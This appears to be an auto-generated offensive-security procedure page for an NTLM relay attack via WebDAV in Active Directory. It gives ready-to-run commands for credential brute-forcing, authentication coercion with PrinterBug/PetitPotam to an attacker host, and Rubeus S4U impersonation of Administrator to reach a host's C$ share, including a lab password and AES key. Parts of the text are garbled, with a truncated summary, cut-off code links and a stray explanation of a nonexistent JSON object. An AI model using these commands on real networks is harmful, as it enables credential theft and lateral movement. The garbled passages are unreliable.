---
id: 9d12f102-7fa3-40bf-a205-4fb61edc85eb
name: WebDAV Relay Attack
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:05.686392+00:00'
updated_at: '2023-04-10T20:36:04.034913+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Brute Force|T1110 - Brute Force]]'
- '[[Pass the Ticket|T1097 - Pass the Ticket]]'
- '[[Remote Services|T1021 - Remote Services]]'
sub_techniques:
- '[[SMB/Windows Admin Shares|T1021.002 - SMB/Windows Admin Shares]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Man-in-the-Middle attacks & relaying]]'
- '[[Relaying with WebDav Trick]]'
commands:
- '[[dementor.py -d DOMAIN -u USER -p PASSWORD ATTACKER_NETBIOS_NAME@PORT/randomfile.txt
  ATTACKER_IP]]'
- '[[Hash WVLFLLKZ$]]'
- '[[List C Drive of PC1]]'
- '[[PetitPotam.exe ATTACKER_NETBIOS_NAME@PORT/randomfile.txt ATTACKER_IP]]'
- '[[Petitpotam.py ATTACKER_NETBIOS_NAME@PORT/randomfile.txt ATTACKER_IP]]'
- '[[Petitpotam.py -d DOMAIN -u USER -p PASSWORD ATTACKER_NETBIOS_NAME@PORT/randomfile.txt
  ATTACKER_IP]]'
- '[[S4U Impersonation]]'
- '[[SpoolSample.exe ATTACKER_IP ATTACKER_NETBIOS_NAME@PORT/randomfile.txt]]'
---

# WebDAV Relay Attack

## Summary

A WebDAV relay attack is a type of man-in-the-middle attack that can be used to relay authentication attempts to a remote system. The attacker can use this technique to gain access to sensitive data, escalate privileges, or move laterally within a network. The attack works by tricking the victim in

## Description

# Description

A WebDAV relay attack is a type of man-in-the-middle attack that can be used to relay authentication attempts to a remote system. The attacker can use this technique to gain access to sensitive data, escalate privileges, or move laterally within a network. The attack works by tricking the victim into connecting to a malicious WebDAV server, which then relays the authentication attempts to a remote system. This can be achieved using a variety of methods, including the use of PrinterBug and PetitPotam.

From a technical perspective, this attack works by exploiting the NTLM authentication protocol used by Windows systems. When a user attempts to authenticate to a remote system, their credentials are hashed and sent to the server. An attacker can intercept these hashed credentials and relay them to another system, effectively impersonating the user.

The business value of this attack is significant, as it can be used to gain access to sensitive data or systems within an organization. By compromising a single user's credentials, an attacker can move laterally within a network and gain access to additional systems and data.

## Requirements

1. Access to a vulnerable WebDAV server

1. Ability to intercept network traffic

1. Knowledge of the target network and systems

## Defense

1. Implement multi-factor authentication to prevent credential theft

1. Monitor network traffic for signs of relay attacks

1. Disable NTLM authentication where possible

## Objectives

1. Compromise a user's credentials

1. Gain access to sensitive data or systems

1. Move laterally within a network

# Instructions

1. To discover WebDAV services, execute the following steps:

1. Use the 'webclientservicescanner' command to scan for WebDAV services on the specified machine, using the provided credentials.

2. Use 'crackmapexec' command to brute-force the credentials of the specified user on the target machines. Use the '-M webdav' option to only target WebDAV services.

3. Use 'GetWebDAVStatus.exe' to retrieve the status of WebDAV services on the target machine.

**Code**: [[webclientservicescanner 'domain.local'/'user':'pas]]

> The 'webclientservicescanner' command is used to scan for WebDAV services on the specified machine. The command requires the domain, username, password, and machine name as arguments.

The 'crackmapexec' command is a password auditing tool that can be used to test the strength of user passwords on a network. The command requires the target machines, domain, username, and password as arguments. The '-M webdav' option is used to only target WebDAV services.

The 'GetWebDAVStatus.exe' command is used to retrieve the status of WebDAV services on the target machine.

2. Follow the below instructions to perform the NTLM relay attack:

1. Generate the malicious file using `dementor.py` command by specifying the domain, username, password, attacker's netbios name, and IP address.

2. Send the malicious file to the target machine using `SpoolSample.exe` command by specifying the attacker's IP address and netbios name along with the port and file name.

3. Trigger the authentication to relay to our nltmrelayx using either `Petitpotam.py` or `PetitPotam.exe` command by specifying the attacker's netbios name, IP address, domain, username, password, and the port and file name of the malicious file.

Note: The listener host must be running ntlmrelayx.

**Code**: [[# PrinterBug
dementor.py -d "DOMAIN" -u "USER" -p ]]

> The above JSON object contains commands and instructions to perform a NTLM relay attack using PrinterBug and PetitPotam tools. The `dementor.py` command is used to generate a malicious file which is then sent to the target machine using `SpoolSample.exe` command. Finally, the authentication is triggered to relay to our nltmrelayx using either `Petitpotam.py` or `PetitPotam.exe` command. The `name` field is filled with the name of the attack, `data` field contains the commands to be executed, `text` field provides a brief description of the attack, `instruction` field contains step-by-step instructions to perform the attack, and `explain` field provides an explanation of the JSON object.

**Command** ([[dementor.py -d DOMAIN -u USER -p PASSWORD ATTACKER_NETBIOS_NAME@PORT/randomfile.txt ATTACKER_IP]]):

```bash
dementor.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
```

**Command** ([[SpoolSample.exe ATTACKER_IP ATTACKER_NETBIOS_NAME@PORT/randomfile.txt]]):

```bash
SpoolSample.exe "ATTACKER_IP" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt"
```

**Command** ([[Petitpotam.py ATTACKER_NETBIOS_NAME@PORT/randomfile.txt ATTACKER_IP]]):

```bash
Petitpotam.py "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
```

**Command** ([[Petitpotam.py -d DOMAIN -u USER -p PASSWORD ATTACKER_NETBIOS_NAME@PORT/randomfile.txt ATTACKER_IP]]):

```bash
Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
```

**Command** ([[PetitPotam.exe ATTACKER_NETBIOS_NAME@PORT/randomfile.txt ATTACKER_IP]]):

```bash
PetitPotam.exe "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
```

3. 1. Run 'Rubeus.exe hash /domain:purple.lab /user:WVLFLLKZ$ /password:'iUAL)l<i$;UzD7W'' to obtain a TGT for the user WVLFLLKZ$.
2. Run 'Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F /impersonateuser:Administrator /msdsspn:host/pc1.purple.lab /altservice:cifs /nowrap /ptt' to request a service ticket for the host/pc1.purple.lab.
3. Run 'ls \\PC1.purple.lab\c$' to access the C drive of the PC1 host.
4. Use the IP address 10.0.0.4 to access the PC1 host if needed.

**Code**: [[.\Rubeus.exe hash /domain:purple.lab /user:WVLFLLK]]

> This command is used to request a service ticket for a specific host. The first command is used to obtain a TGT for the user WVLFLLKZ$. The second command is used to request a service ticket for the host/pc1.purple.lab using the TGT obtained in the first command. The third command is used to access the C drive of the PC1 host. The IP address of the host is provided for reference in case it is needed.

**Command** ([[Hash WVLFLLKZ$]]):

```bash
.\Rubeus.exe hash /domain:purple.lab /user:WVLFLLKZ$ /password:'iUAL)l<i$;UzD7W'
```

**Command** ([[S4U Impersonation]]):

```bash
.\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F /impersonateuser:Administrator /msdsspn:host/pc1.purple.lab /altservice:cifs /nowrap /ptt
```

**Command** ([[List C Drive of PC1]]):

```bash
ls \\PC1.purple.lab\c$
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Brute Force|T1110 - Brute Force]]
- [[Pass the Ticket|T1097 - Pass the Ticket]]
- [[Remote Services|T1021 - Remote Services]]

### Sub-Techniques

- [[SMB/Windows Admin Shares|T1021.002 - SMB/Windows Admin Shares]]

## Commands Used

- [[dementor.py -d DOMAIN -u USER -p PASSWORD ATTACKER_NETBIOS_NAME@PORT/randomfile.txt ATTACKER_IP]]
- [[Hash WVLFLLKZ$]]
- [[List C Drive of PC1]]
- [[PetitPotam.exe ATTACKER_NETBIOS_NAME@PORT/randomfile.txt ATTACKER_IP]]
- [[Petitpotam.py ATTACKER_NETBIOS_NAME@PORT/randomfile.txt ATTACKER_IP]]
- [[Petitpotam.py -d DOMAIN -u USER -p PASSWORD ATTACKER_NETBIOS_NAME@PORT/randomfile.txt ATTACKER_IP]]
- [[S4U Impersonation]]
- [[SpoolSample.exe ATTACKER_IP ATTACKER_NETBIOS_NAME@PORT/randomfile.txt]]

## Tags

- [[Active Directory Attacks]]
- [[Man-in-the-Middle attacks & relaying]]
- [[Relaying with WebDav Trick]]
